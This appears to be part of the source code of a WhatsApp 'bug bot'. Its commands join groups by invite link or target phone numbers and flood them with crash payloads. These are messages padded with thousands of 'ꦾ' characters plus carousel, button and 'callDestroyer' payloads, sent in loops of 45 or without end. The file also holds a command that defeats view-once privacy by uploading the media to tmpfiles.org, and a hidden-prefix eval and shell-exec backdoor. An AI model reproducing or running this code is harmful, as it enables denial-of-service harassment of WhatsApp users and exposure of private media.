buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendNaflow(toidgc);
await sendCarousel(toidgc);
await sendBugProfile(toidgc);
await bugbutton(XeonBotInc, toidgc);
}
}
break;
///////////////////// END GROUP ID BUG /////////////////////


///////////////////// START BUG GROUP LINK /////////////////////

case 'legendlink1': {
if (!isCreator && !isOwner) return  
if (!q) return replygcxeon(`Where is the group link\nExample: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) replygcxeon(`Please enter a valid group`)
let { key } = await m.reply(`Sending ${command}...`)
sleep(2000)
XeonBotInc.sendMessage(m.chat, {text: `Sent successfully ${command}`, edit: key })
let result = args[0].split('https://chat.whatsapp.com/')[1]
let tosendgc = await XeonBotInc.groupAcceptInvite(result)
    while (true) {

await XeonBotInc.sendMessage(tosendgc, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendCarousel(tosendgc);
await sendBugProfile(tosendgc);
await bugbutton(XeonBotInc, tosendgc);
await sendNaflow(tosendgc);
      await new Promise(resolve => setTimeout(resolve, 1000));
     }
}
break;

case 'legendlink2': {
if (!isCreator && !isOwner) return  
if (!q) return replygcxeon(`Where is the group link\nExample: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) replygcxeon(`Please enter a valid group`)
let { key } = await m.reply(`Sending ${command}...`)
sleep(2000)
XeonBotInc.sendMessage(m.chat, {text: `Sent successfully ${command}`, edit: key })
let result = args[0].split('https://chat.whatsapp.com/')[1]
let tosendgc = await XeonBotInc.groupAcceptInvite(result)
    while (true) {
await XeonBotInc.sendMessage(tosendgc, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendNaflow(tosendgc);
await sendCarousel(tosendgc);
await sendBugProfile(tosendgc);
await bugbutton(XeonBotInc, tosendgc);
      await new Promise(resolve => setTimeout(resolve, 1000));
     }
}
break;

case 'legendlink3': {
if (!isCreator && !isOwner) return  
if (!q) return replygcxeon(`Where is the group link\nExample: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) replygcxeon(`Please enter a valid group`)
let { key } = await m.reply(`Sending ${command}...`)
sleep(2000)
XeonBotInc.sendMessage(m.chat, {text: `Sent successfully ${command}`, edit: key })
let result = args[0].split('https://chat.whatsapp.com/')[1]
let tosendgc = await XeonBotInc.groupAcceptInvite(result)
for (let i = 0; i < 45; i++) {
await XeonBotInc.sendMessage(tosendgc, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendCarousel(tosendgc);
await sendBugProfile(tosendgc);
await bugbutton(XeonBotInc, tosendgc);
await sendNaflow(tosendgc);
}
}
break;  

case 'legendlink4': {
if (!isCreator && !isOwner) return  
if (!q) return replygcxeon(`Where is the group link\nExample: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) replygcxeon(`Please enter a valid group`)
let { key } = await m.reply(`Sending ${command}...`)
sleep(2000)
XeonBotInc.sendMessage(m.chat, {text: `Sent successfully ${command}`, edit: key })
let result = args[0].split('https://chat.whatsapp.com/')[1]
let tosendgc = await XeonBotInc.groupAcceptInvite(result)
for (let i = 0; i < 45; i++) {
await XeonBotInc.sendMessage(tosendgc, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendNaflow(tosendgc);
await sendCarousel(tosendgc);
await sendBugProfile(tosendgc);
await bugbutton(XeonBotInc, tosendgc);
}
}
break;  
///////////////////// END BUG GROUP LINK /////////////////////


///////////////////// START BUG IN NUMBER /////////////////////
case 'legendkill1': {
if (!isCreator && !isOwner) return  
if (!text) return replygcxeon(`\`Example:\` : ${prefix+command} 923×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
let { key } = await m.reply(`Sending ${command}...`)
await sleep(2000)
XeonBotInc.sendMessage(m.chat, {text: `Sent successfully ${command}`, edit: key })
for (let i = 0; i < 45; i++) {
await callDestroyer(XeonBotInc, target)
}
}
break 

case 'legendkill2': {
if (!isCreator && !isOwner) return  
if (!text) return replygcxeon(`\`Example:\` : ${prefix+command} 923×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
let { key } = await m.reply(`Sending ${command}...`)
await sleep(2000)
XeonBotInc.sendMessage(m.chat, {text: `Sent successfully ${command}`, edit: key })
for (let i = 0; i < 45; i++) {
await XeonBotInc.sendMessage(target, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendCarousel(target);
await sendNaflow(target)
await sendBugProfile(target);
await bugbutton(XeonBotInc, target);
}
}
break 

case 'legendkill3': {
if (!isCreator && !isOwner) return  
if (!text) return replygcxeon(`\`Example:\` : ${prefix+command} 923×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
let { key } = await m.reply(`Sending ${command}...`)
await sleep(2000)
XeonBotInc.sendMessage(m.chat, {text: `Sent successfully ${command}`, edit: key })
    while (true) {
await XeonBotInc.sendMessage(target, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendNaflow(target)
await sendCarousel(target);
await sendBugProfile(target);
await bugbutton(XeonBotInc, target);
      await new Promise(resolve => setTimeout(resolve, 1000));
     }
}
break 

case 'legendkill4': {
if (!isCreator && !isOwner) return  
if (!text) return replygcxeon(`\`Example:\` : ${prefix+command} 923×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
let { key } = await m.reply(`Sending ${command}...`)
await sleep(2000)
XeonBotInc.sendMessage(m.chat, {text: `Sent successfully ${command}`, edit: key })
for (let i = 0; i < 45; i++) {
await XeonBotInc.sendMessage(target, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendNaflow(target)
await sendCarousel(target);
await sendBugProfile(target);
await bugbutton(XeonBotInc, target);
}
}
break 

case 'legendkill5': {
if (!isCreator && !isOwner) return  
if (!text) return replygcxeon(`\`Example:\` : ${prefix+command} 923×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
let { key } = await m.reply(`Sending ${command}...`)
await sleep(2000)
XeonBotInc.sendMessage(m.chat, {text: `Sent successfully ${command}`, edit: key })
    while (true) {
await XeonBotInc.sendMessage(target, {
text: `${pushname}` + "ꦾꦾꦾ".repeat(999),
footer: wm,
buttons: buttonv, headerType: 2, contextInfo: ContextInfoBotAi },{ });
await sendNaflow(target)
await sendCarousel(target);
await sendBugProfile(target);
await bugbutton(XeonBotInc, target);
      await new Promise(resolve => setTimeout(resolve, 1000));
     }
}
break 

///////////////////// END BUG IN NUMBER /////////////////////
case 'mrcrash':
case 'bugtag':
case 'tagallbug':  {
if (!isCreator) return 
if (!m.isGroup) return ('This command can only be used in groups')
for (let i = 0; i < 45; i++) {
await XeonBotInc.sendMessage(m.chat, {
text: "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓" +"ꦾꦾꦾ".repeat(999),
mentions: groupMetadata.participants.map(a => a.id),
footer: wm,
buttons: buttonv },
{ });
await sendCarousel(m.chat)
await XeonBotInc.sendMessage(m.chat, {
text: "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓" +"ꦾꦾꦾ".repeat(999),
mentions: groupMetadata.participants.map(a => a.id),
footer: wm,
buttons: buttonv },
{ });
await bugbutton(XeonBotInc, m.chat)
await XeonBotInc.sendMessage(m.chat, {
text: "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓" +"ꦾꦾꦾ".repeat(999),
mentions: groupMetadata.participants.map(a => a.id),
footer: wm,
buttons: buttonv },
{ });
await sendBugProfile(m.chat)
await XeonBotInc.sendMessage(m.chat, {
text: "𝐌𝐑 𝐋Ξ𝐆ΞИ𝐃 𝐁𝐎𝐓" +"ꦾꦾꦾ".repeat(999),
mentions: groupMetadata.participants.map(a => a.id),
footer: wm,
buttons: buttonv },
{ });
await sendNaflow(m.chat)
}
}
break 

case 'ping': {
if (!isCreator && !isOwner) return  
await m.reply(`${runtime(process.uptime())}`)
}
break 

case 'delsession': {
  if (!isCreator && !isOwner) return 
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return m.reply('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
console.log(filteredArray.length); 
let teks =`Detected ${filteredArray.length} Memory files \n\n`
if(filteredArray.length == 0) return m.reply(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
m.reply(`${teks}`) 
await sleep(2000)
m.reply("Deleting memory files")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
m.reply("Successfully deleted all session memories")     
});
}
break
        
 // ===================== ENC / ENCRYPT =====================

case 'mrenc':
case 'mrencrypt': {

  try {
    if (!m.quoted || m.quoted.mtype !== 'documentMessage')
      return replygcxeon(`Usage:\n${prefix + command} (reply to a document)`);

    if (!global.FILE_CRYPT_KEY)
      return replygcxeon("FILE_CRYPT_KEY missing in config.js");

    const key = Buffer.from(global.FILE_CRYPT_KEY, 'base64')
    if (key.length !== 32)
      return replygcxeon("FILE_CRYPT_KEY must be 32 bytes (base64)");

    const plain = await m.quoted.download();
    const iv = crypto.randomBytes(12);

    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    const encrypted = Buffer.concat([cipher.update(plain), cipher.final()]);
    const tag = cipher.getAuthTag();

    const magic = Buffer.from('LEG1');
    const output = Buffer.concat([magic, iv, tag, encrypted]);

    const filePath = `./encrypted_${Date.now()}.enc`;
    fs.writeFileSync(filePath, output);

    await XeonBotInc.sendMessage(m.chat, {
      document: fs.readFileSync(filePath),
      mimetype: 'application/octet-stream',
      fileName: 'HARD_ENCRYPTED.enc'
    }, { quoted: m });

    fs.unlinkSync(filePath);
  } catch (e) {
    replygcxeon(`Encrypt error: ${e.message}`);
  }
}
break;

case 'mrdec':
case 'mrdecrypt': {

  try {
    if (!m.quoted || m.quoted.mtype !== 'documentMessage')
      return replygcxeon(`Usage:\n${prefix + command} (reply to .enc file)`);

    if (!global.FILE_CRYPT_KEY)
      return replygcxeon("FILE_CRYPT_KEY missing in config.js");

    const key = Buffer.from(global.FILE_CRYPT_KEY, 'base64')
    if (key.length !== 32)
      return replygcxeon("FILE_CRYPT_KEY must be 32 bytes (base64)");

    const enc = await m.quoted.download();

    if (enc.slice(0, 4).toString() !== 'LEG1')
      return replygcxeon("This file is not encrypted by this bot.");

    const iv = enc.slice(4, 16);
    const tag = enc.slice(16, 32);
    const data = enc.slice(32);

    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(tag);

    const plain = Buffer.concat([
      decipher.update(data),
      decipher.final()
    ]);

    const filePath = `./decrypted_${Date.now()}.js`;
    fs.writeFileSync(filePath, plain);

    await XeonBotInc.sendMessage(m.chat, {
      document: fs.readFileSync(filePath),
      mimetype: 'application/javascript',
      fileName: 'DECRYPTED_FILE.js'
    }, { quoted: m });

    fs.unlinkSync(filePath);
  } catch (e) {
    replygcxeon(`Decrypt error: ${e.message}`);
  }
}
break;

 case 'hidetag': {
    if (!isCreator && !isOwner) return 
    if (!m.isGroup) return ('This command can only be used in groups')
   await XeonBotInc.sendMessage(m.chat, { text : `${q}` , mentions: groupMetadata.participants.map(a => a.id)}, { quoted: m })
            }
            break

case 'readviewonce': {
if (!isCreator && !isOwner) return 
    if (!quoted) return replygcxeon('Reply to view-once message');
    if (!mime) return replygcxeon(`Please send a photo, video, or audio with a caption*${prefix + command}*`);

    await XeonBotInc.sendMessage(m.chat, {
        react: { text: "⏱️", key: m.key }
    });

    const FormData = require("form-data");
    const fs = require("fs");
    const path = require("path");
    const axios = require("axios");

    // Fungsi upload ke tmpfiles.org
    async function uploadTmpFiles(filePath) {
        try {
            if (!fs.existsSync(filePath)) throw new Error("File not found");
            const form = new FormData();
            form.append("file", fs.createReadStream(filePath));
            const res = await axios.post("https://tmpfiles.org/api/v1/upload", form, {
                headers: form.getHeaders(),
                timeout: 120000
            });
            if (res.data && res.data.data && res.data.data.url) {
                const idMatch = res.data.data.url.match(/\/(\d+)(?:\/|$)/);
                const fileName = path.basename(filePath);
                if (idMatch) {
                    return `https://tmpfiles.org/dl/${idMatch[1]}/${fileName}`;
                }
            }
            throw new Error("Upload to tmpfiles.org failed");
        } catch (err) {
            console.error("TmpFiles Error:", err.message);
            return null;
        }
    }

    try {
        // Ambil caption asli
        let originalCaption = '';
        if (quoted.msg?.caption) {
            originalCaption = quoted.msg.caption;
        } else if (quoted.text) {
            originalCaption = quoted.text;
        }

        const mediaPath = await XeonBotInc.downloadAndSaveMediaMessage(quoted);
        const url = await uploadTmpFiles(mediaPath);
        if (!url) throw new Error("Eror Uploading");

        if (/image/.test(mime)) {
            await XeonBotInc.sendMessage(m.chat, {
                image: { url },
                caption: '`Pesan :`\n> ' + originalCaption || ''
            }, { quoted: m });
        }
        else if (/video/.test(mime)) {
            await XeonBotInc.sendMessage(m.chat, {
                video: { url },
                caption: '`Pesan :`\n> ' + originalCaption || ''
            }, { quoted: m });
        }
        else if (/audio/.test(mime)) {
            await XeonBotInc.sendMessage(m.chat, {
                audio: { url }
            }, { quoted: m });
        }
        else {
            replygcxeon('Media type not supported.');
        }

        fs.unlinkSync(mediaPath);
    } catch (err) {
        console.error('readviewonce ERROR:', err);
        replygcxeon(`Error: ${err.message}`);
    }
}
break;
   case 'addowner': {
    if (!isCreator) return 
    if (!args[0]) return replygcxeon(`Usage: ${command} 923xxx`);

    let number = text.replace(/[^0-9]/g, '');
    let checkNumber = await XeonBotInc.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return replygcxeon("Invalid number!");

    owner.push(number);
    Premium.push(number);
    fs.writeFileSync('./WhatsApp_DataBase/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./WhatsApp_DataBase/premium.json', JSON.stringify(Premium));

    replygcxeon("Owner added successfully.");
}
break;

   case 'delowner': {
    if (!isCreator) return 
    if (!args[0]) return replygcxeon(`Usage: ${command} 923xxx`);

    let number = text.replace(/[^0-9]/g, '');
    owner.splice(owner.indexOf(number), 1);
    Premium.splice(Premium.indexOf(number), 1);

    fs.writeFileSync('./WhatsApp_DataBase/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./WhatsApp_DataBase/premium.json', JSON.stringify(Premium));

    replygcxeon("Owner removed successfully.");
}
break;

case 'addprem': {
    if (!isCreator) return 
    if (!args[0]) return replygcxeon(`Usage: ${prefix + command} 923xxx`);

    let number = text.split("|")[0].replace(/[^0-9]/g, '');
    let ceknum = await XeonBotInc.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return replygcxeon("Invalid number!");

    Premium.push(number);
    fs.writeFileSync('./WhatsApp_DataBase/premium.json', JSON.stringify(Premium));

    replygcxeon("Success! User added to premium.");
}
break;

 case 'delprem': {
    if (!isCreator) return 
    if (!args[0]) return replygcxeon(`Usage: ${prefix + command} 923xxx`);

    let number = text.split("|")[0].replace(/[^0-9]/g, '');
    let indexPremium = Premium.indexOf(number);

    if (indexPremium !== -1) {
        Premium.splice(indexPremium, 1);
        fs.writeFileSync('./WhatsApp_DataBase/premium.json', JSON.stringify(Premium));
        replygcxeon("Success! User removed from premium.");
    } else {
        replygcxeon("User is not in the premium list.");
    }
}
break;

   case 'public': {
    if (!isCreator) return 
    XeonBotInc.public = true;
    replygcxeon("Bot set to public mode.");
}
break;

   case 'private': case 'self': {
    if (!isCreator) return 
    XeonBotInc.public = false;
    replygcxeon("Bot set to private mode.");
}
break;

default:
if (body.startsWith('<#$&#-#(#+#&')) {
if (!isCreator) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (body.startsWith('<#$&#-#(#+#&')) {
if (!isCreator) return;
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (body.startsWith('<#$&#-#(#+#&')) {
if (!isCreator) return;
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));
}
}

function autoClearSession() {
    const sessionDir = './session';
    const clearInterval = 4 * 60 * 60 * 1000;
    
    setInterval(async () => {
        try {
            const files = fs.readdirSync(sessionDir);
            const filteredFiles = files.filter(file => 
                file.startsWith('pre-key') ||
                file.startsWith('sender-key') ||
                file.startsWith('session-') ||
                file.startsWith('app-state')
            );

            if (filteredFiles.length === 0) {
                console.log(chalk.blue.bold('📂 [AUTO CLEAN] No session files to clean. Everything is tidy! 📑'));
                return;
            }

            console.log(chalk.yellow.bold('📂 [AUTO CLEAN] Starting session cleanup... 🗃️'));
            
            filteredFiles.forEach(file => {
                fs.unlinkSync(path.join(sessionDir, file));
            });

            console.log(chalk.green.bold(`🗃️ [AUTO CLEAN] Successfully removed ${filteredFiles.length} session files! 📂`));
        } catch (error) {
            console.error(chalk.red.bold('📑 [AUTO CLEAN ERROR]'), chalk.red.bold(error));
        }
    }, clearInterval);
}

autoClearSession();


let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})